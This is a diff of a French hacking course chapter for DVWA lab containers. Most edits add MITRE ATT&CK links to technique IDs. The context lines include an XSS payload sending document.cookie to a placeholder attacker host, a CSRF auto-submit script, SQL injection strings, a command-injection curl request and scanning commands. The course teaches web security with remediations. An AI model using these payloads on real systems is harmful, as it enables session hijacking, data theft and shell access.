@@ -180,7 +180,7 @@ Ce chapitre couvre la matrice ATT&CK (14 tactiques, 200+ techniques), le mapping
 
 ![MITRE ATT&CK v15 — Chaîne complète des 14 tactiques](mitre-attack-chain.png)
 
-**Fig 2** — Chaîne complète MITRE ATT&CK v15 : 14 tactiques de TA0001 Reconnaissance à TA0014 Impact.
+**Fig 2** — Chaîne complète MITRE ATT&CK v15 : 14 tactiques de la Reconnaissance à l'Impact.
 
 ### Correspondance attaques → techniques ATT&CK
 
@@ -207,7 +207,7 @@ flowchart LR
 
 ## 3. Outils fondamentaux
 
-### nmap → T1046 Network Service Scanning
+### nmap → [T1046](https://attack.mitre.org/techniques/T1046/) Network Service Scanning
 
 ```bash
 # nmap -sV : détection de version des services (-sV = probe les bannières pour identifier version précise)
@@ -218,7 +218,7 @@ nmap -A <IP>               # OS + scripts + versions
 nmap --script vuln <IP>    # Vulnérabilités connues
 ```
 
-### Metasploit → TA0001-TA0006
+### Metasploit → [TA0001](https://attack.mitre.org/tactics/TA0001/)-TA0006
 
 ```bash
 # Lancement de la console interactive Metasploit (framework d'exploitation modulaire)
@@ -233,7 +233,7 @@ set RHOSTS <IP>
 exploit
 ```
 
-### Wireshark → T1040 Network Sniffing
+### Wireshark → [T1040](https://attack.mitre.org/techniques/T1040/) Network Sniffing
 
 Filtres : `http`, `tcp.port == 80`, `ip.addr == <IP>`
 
@@ -241,7 +241,7 @@ Filtres : `http`, `tcp.port == 80`, `ip.addr == <IP>`
 
 ## 4. Les 4 vulnérabilités web fondamentales
 
-### XSS → T1189 Drive-by Compromise
+### XSS → [T1189](https://attack.mitre.org/techniques/T1189/) Drive-by Compromise
 
 **Contexte métier :** 65% des applications web ont eu au moins une XSS. Un attaquant vole le cookie de session d'un administrateur → accès complet au back-office.
 
@@ -261,7 +261,7 @@ flowchart LR
 <script>new Image().src='http://<KALI_IP>:8000/?c='+document.cookie</script>
 ```
 
-### CSRF → T1203 Exploitation for Client Execution
+### CSRF → [T1203](https://attack.mitre.org/techniques/T1203/) Exploitation for Client Execution
 
 **Contexte métier :** L'attaquant force un utilisateur authentifié à exécuter une action (virement, changement de mot de passe) sans son consentement, simplement en visitant une page piégée.
 
@@ -272,7 +272,7 @@ flowchart LR
 <script>document.forms[0].submit();</script>
 ```
 
-### SQL Injection → T1190 Exploit Public-Facing Application
+### SQL Injection → [T1190](https://attack.mitre.org/techniques/T1190/) Exploit Public-Facing Application
 
 **Contexte métier :** Première cause de breach de données selon l'OWASP. Un attaquant extrait la base clients complète, la revend sur le dark web. Coût moyen : 4.5M$.
 
@@ -283,7 +283,7 @@ admin' OR '1'='1' --
 ' UNION SELECT username, password FROM users --
 ```
 
-### Command Injection → T1059.004 Unix Shell
+### Command Injection → [T1059.004](https://attack.mitre.org/techniques/T1059/004/) Unix Shell
 
 **Contexte métier :** 30% des applications qui exécutent des commandes système sont vulnérables. Un `ping` mal sécurisé donne un shell complet sur le serveur.
 
@@ -382,7 +382,7 @@ gobuster dir -u http://localhost:8088 -w /usr/share/wordlists/dirb/common.txt -q
 
 | Durée | Conteneur | Technique ATT&CK |
 |---|---|---|
-| 30 min | dvwa :8088 | T1189 Drive-by Compromise |
+| 30 min | dvwa :8088 | [T1189](https://attack.mitre.org/techniques/T1189/) Drive-by Compromise |
 
 ### Contexte technique
 
@@ -457,7 +457,7 @@ curl -s -b "PHPSESSID=XXXX;security=low" \
 
 | Durée | Conteneur | Technique ATT&CK |
 |---|---|---|
-| 30 min | dvwa :8088 | T1190 Exploit Public-Facing App |
+| 30 min | dvwa :8088 | [T1190](https://attack.mitre.org/techniques/T1190/) Exploit Public-Facing App |
 
 ### Contexte technique
 
@@ -539,7 +539,7 @@ L'injection SQL se corrige en **ne concaténant jamais l'entrée utilisateur dan
 
 | Durée | Conteneur | Technique ATT&CK |
 |---|---|---|
-| 30 min | dvwa :8088 | T1059.004 Unix Shell |
+| 30 min | dvwa :8088 | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) Unix Shell |
 
 ### Contexte technique
 
@@ -613,7 +613,7 @@ curl -s "http://localhost:8088/vulnerabilities/exec/" --data "ip=127.0.0.1;whoam
 
 | Durée | Conteneur | Dossier | Techniques |
 |---|---|---|---|
-| 1h | sqli-app (port 8083) | `~/cours-hacking/jour-1/labs/` | T1190 + T1110.001 |
+| 1h | sqli-app (port 8083) | `~/cours-hacking/jour-1/labs/` | [T1190](https://attack.mitre.org/techniques/T1190/) + [T1110.001](https://attack.mitre.org/techniques/T1110/001/) |
 
 ### Contexte métier
 
@@ -888,7 +888,7 @@ sqlmap -u "http://localhost:8083/?page=search&id=1" --batch 2>&1 | grep -i "inje
 
 ### Exercice 1 : Couche ATT&CK Navigator
 
-**Énoncé :** Créez une couche avec T1046, T1189, T1190, T1059.004, T1203. Exportez en JSON.
+**Énoncé :** Créez une couche avec [T1046](https://attack.mitre.org/techniques/T1046/), [T1189](https://attack.mitre.org/techniques/T1189/), [T1190](https://attack.mitre.org/techniques/T1190/), [T1059.004](https://attack.mitre.org/techniques/T1059/004/), [T1203](https://attack.mitre.org/techniques/T1203/). Exportez en JSON.
 
 <details><summary><strong>Solution</strong></summary>
 1. https://mitre-attack.github.io/attack-navigator/ → New Layer → Enterprise v15
@@ -901,7 +901,7 @@ sqlmap -u "http://localhost:8083/?page=search&id=1" --batch 2>&1 | grep -i "inje
 **Énoncé :** WannaCry (2017) utilisait EternalBlue. Quelles techniques ATT&CK ?
 
 <details><summary><strong>Solution</strong></summary>
-- EternalBlue → T1210 (TA0008), DoublePulsar → T1543.003 (TA0003), Chiffrement → T1486 (TA0014)
+- EternalBlue → [T1210](https://attack.mitre.org/techniques/T1210/) ([TA0008](https://attack.mitre.org/tactics/TA0008/)), DoublePulsar → [T1543.003](https://attack.mitre.org/techniques/T1543/003/) ([TA0003](https://attack.mitre.org/tactics/TA0003/)), Chiffrement → [T1486](https://attack.mitre.org/techniques/T1486/) ([TA0014](https://attack.mitre.org/tactics/TA0014/))
 </details>
 
 ### Exercice 3 : Mini-rapport DVWA
@@ -909,17 +909,17 @@ sqlmap -u "http://localhost:8083/?page=search&id=1" --batch 2>&1 | grep -i "inje
 **Énoncé :** Rédigez 4 fiches (une par vulnérabilité) avec type, ATT&CK, impact, remédiation.
 
 <details><summary><strong>Solution</strong></summary>
-1. XSS → T1189 → htmlspecialchars() + CSP
-2. CSRF → T1203 → Token anti-CSRF
-3. SQLi → T1190 → Requêtes préparées PDO
-4. CMDi → T1059.004 → escapeshellcmd()
+1. XSS → [T1189](https://attack.mitre.org/techniques/T1189/) → htmlspecialchars() + CSP
+2. CSRF → [T1203](https://attack.mitre.org/techniques/T1203/) → Token anti-CSRF
+3. SQLi → [T1190](https://attack.mitre.org/techniques/T1190/) → Requêtes préparées PDO
+4. CMDi → [T1059.004](https://attack.mitre.org/techniques/T1059/004/) → escapeshellcmd()
 </details>
 
 ---
 
 ## Points clés à retenir
 
-- **MITRE ATT&CK** : chaque attaque → ID Txxxx (T1046, T1189, T1190, T1059.004)
+- **MITRE ATT&CK** : chaque attaque → ID Txxxx ([T1046](https://attack.mitre.org/techniques/T1046/), [T1189](https://attack.mitre.org/techniques/T1189/), [T1190](https://attack.mitre.org/techniques/T1190/), [T1059.004](https://attack.mitre.org/techniques/T1059/004/))
 - Les 14 tactiques couvrent le cycle complet d'une cyberattaque
 - **DVWA** expose les 4 familles de vulnérabilités web
 - **XSS vole des sessions**, **SQLi vole des données**, **CMDi donne un shell**
